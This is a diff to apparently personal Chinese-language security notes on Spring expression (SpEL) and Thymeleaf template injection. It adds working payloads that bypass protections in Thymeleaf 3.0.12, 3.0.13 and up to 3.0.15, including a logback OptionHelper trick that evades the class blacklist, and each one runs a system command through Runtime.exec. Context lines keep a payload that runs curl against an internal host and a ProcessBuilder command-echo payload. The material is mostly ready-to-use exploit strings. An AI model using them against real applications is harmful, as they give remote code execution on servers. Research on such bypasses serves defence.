@@ -228,6 +228,28 @@ public class EmailSender {
 
 `''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')`
 
+##### 高版本绕过
+
+* 3.0.12
+
+```txt
+__%24%7b%00new+java.util.Scanner(T+(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__
+```
+
+* 3.0.13
+
+```txt
+%24%7b%00new+java.util.Scanner(%00T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d
+```
+
+* 可控模板文件内容，核心在于绕过黑名单类，可过3.0.15
+
+```java
+[[${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName("org.springframework.expression.spel.standard.SpelExpressionParser","".getClass().getSuperclass(),T(ch.qos.logback.core.util.OptionHelper).getClassLoader()).parseExpression("T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')").getValue()}]]
+```
+
+
+
 ### SpEL注入回显
 
 ##### 非通用回显
@@ -255,6 +277,13 @@ new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd
 ```java
 new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
 ```
+
+##### 通用回显
+
+* strust2
+* Springboot（TODO1）
+
+
 
 ### SpEL相关漏洞分析
 
